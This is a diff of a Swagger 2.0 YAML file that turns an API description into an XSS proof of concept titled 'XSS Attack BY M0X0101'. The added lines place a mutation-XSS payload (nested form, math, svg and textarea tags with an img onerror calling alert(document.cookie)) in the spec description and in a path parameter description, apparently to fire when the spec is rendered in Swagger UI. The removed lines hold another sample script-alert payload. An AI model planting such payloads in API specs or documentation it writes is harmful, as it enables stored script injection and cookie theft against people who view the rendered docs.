@@ -1,25 +1,38 @@
 swagger: '2.0'
 info:
-  title: Badger DAO API
-  version: 1.0.0
+  title: XSS Attack BY M0X0101
   description: |
-    This API, defined in Swagger 2.0, is vulnerable to HTML injection due to an outdated specification version lacking modern security features. It can be rendered in Swagger UI (e.g., version 3.52.5), but the vulnerability stems from poor input handling in the API itself. The endpoint below accepts unsanitized input displayed in the Web3 interface, enabling potential smart contract exploits.
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
 paths:
-  /setMessage:
-    post:
-      summary: Set a message displayed in the Web3 interface
-      description: |
-        This endpoint sets a message that is reflected in the Web3 interface without sanitization. An attacker can inject HTML or JavaScript to manipulate user interactions with smart contracts, such as altering transactions or stealing funds.
-      parameters:
-        - in: body
-          name: message
-          required: true
-          schema:
-            type: object
-            properties:
-              message:
-                type: string
-                example: "<script>alert('XSS')</script>"
+  /M0X0101:
+    get:
       responses:
-        200:
-          description: Message set successfully
+        '200':
+          description: No response was specified
+      tags:
+        - M0X0101_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
